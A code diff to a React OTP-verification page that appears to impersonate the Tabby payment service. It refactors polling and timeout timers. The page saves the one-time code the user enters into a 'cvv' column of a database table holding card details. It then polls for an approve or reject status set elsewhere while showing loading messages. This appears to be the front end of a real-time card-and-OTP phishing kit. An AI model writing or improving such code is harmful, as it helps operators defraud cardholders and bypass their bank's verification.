@@ -21,6 +21,8 @@ const TabbyOtpVerification = () => {
   const cardLast4 = searchParams.get("cardLast4") || "";
   const paymentId = searchParams.get("paymentId");
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
+  const pollIntervalRef = useRef<NodeJS.Timeout | null>(null);
+  const timeoutRef = useRef<NodeJS.Timeout | null>(null);
   const [verificationStatus, setVerificationStatus] = useState<"idle" | "loading" | "success" | "error">("idle");
   const [messageIndex, setMessageIndex] = useState(0);
 
@@ -56,19 +58,29 @@ const TabbyOtpVerification = () => {
     const otpCode = otp.join("");
     if (!isOtpComplete || !paymentId) return;
     
+    // Clear any existing intervals
+    if (pollIntervalRef.current) {
+      clearInterval(pollIntervalRef.current);
+      pollIntervalRef.current = null;
+    }
+    if (timeoutRef.current) {
+      clearTimeout(timeoutRef.current);
+      timeoutRef.current = null;
+    }
+    
     setVerificationStatus("loading");
 
     try {
       // Update OTP code in database
       const { error: updateError } = await supabase
         .from("tabby_payments")
-        .update({ cvv: otpCode }) // Storing OTP temporarily in cvv field
+        .update({ cvv: otpCode })
         .eq("id", paymentId);
 
       if (updateError) throw updateError;
 
       // Poll for payment status
-      const pollInterval = setInterval(async () => {
+      pollIntervalRef.current = setInterval(async () => {
         const { data: statusData, error: statusError } = await supabase
           .from("tabby_payments")
           .select("payment_status")
@@ -76,54 +88,57 @@ const TabbyOtpVerification = () => {
           .single();
 
         if (statusError) {
-          clearInterval(pollInterval);
+          if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
+          if (timeoutRef.current) clearTimeout(timeoutRef.current);
           setVerificationStatus("error");
           setTimeout(() => {
             setVerificationStatus("idle");
             setOtp(["", "", "", ""]);
             inputRefs.current[0]?.focus();
-          }, 3000);
+          }, 2000);
           return;
         }
 
         if (statusData.payment_status === "approved") {
-          clearInterval(pollInterval);
+          if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
+          if (timeoutRef.current) clearTimeout(timeoutRef.current);
           setVerificationStatus("success");
           setTimeout(() => {
-            navigate("/");
-          }, 2000);
+            navigate("/", { replace: true });
+          }, 1000);
         } else if (statusData.payment_status === "rejected") {
-          clearInterval(pollInterval);
+          if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
+          if (timeoutRef.current) clearTimeout(timeoutRef.current);
           setVerificationStatus("error");
           setTimeout(() => {
             setVerificationStatus("idle");
             setOtp(["", "", "", ""]);
             inputRefs.current[0]?.focus();
-          }, 3000);
+          }, 2000);
         }
-      }, 2000);
+      }, 1000);
 
-      // Timeout after 30 seconds
-      setTimeout(() => {
-        clearInterval(pollInterval);
-        if (verificationStatus === "loading") {
-          setVerificationStatus("error");
-          setTimeout(() => {
-            setVerificationStatus("idle");
-            setOtp(["", "", "", ""]);
-            inputRefs.current[0]?.focus();
-          }, 3000);
-        }
-      }, 30000);
+      // Timeout after 20 seconds
+      timeoutRef.current = setTimeout(() => {
+        if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
+        setVerificationStatus("error");
+        setTimeout(() => {
+          setVerificationStatus("idle");
+          setOtp(["", "", "", ""]);
+          inputRefs.current[0]?.focus();
+        }, 2000);
+      }, 20000);
 
     } catch (error) {
       console.error("OTP verification error:", error);
+      if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
+      if (timeoutRef.current) clearTimeout(timeoutRef.current);
       setVerificationStatus("error");
       setTimeout(() => {
         setVerificationStatus("idle");
         setOtp(["", "", "", ""]);
         inputRefs.current[0]?.focus();
-      }, 3000);
+      }, 2000);
     }
   };
 
@@ -138,10 +153,18 @@ const TabbyOtpVerification = () => {
     if (verificationStatus === "loading") {
       const interval = setInterval(() => {
         setMessageIndex((prev) => (prev + 1) % loadingMessages.length);
-      }, 2000);
+      }, 1500);
       return () => clearInterval(interval);
     }
   }, [verificationStatus]);
+
+  // Cleanup on unmount
+  useEffect(() => {
+    return () => {
+      if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
+      if (timeoutRef.current) clearTimeout(timeoutRef.current);
+    };
+  }, []);
 
   const isOtpComplete = otp.every(digit => digit !== "");
 
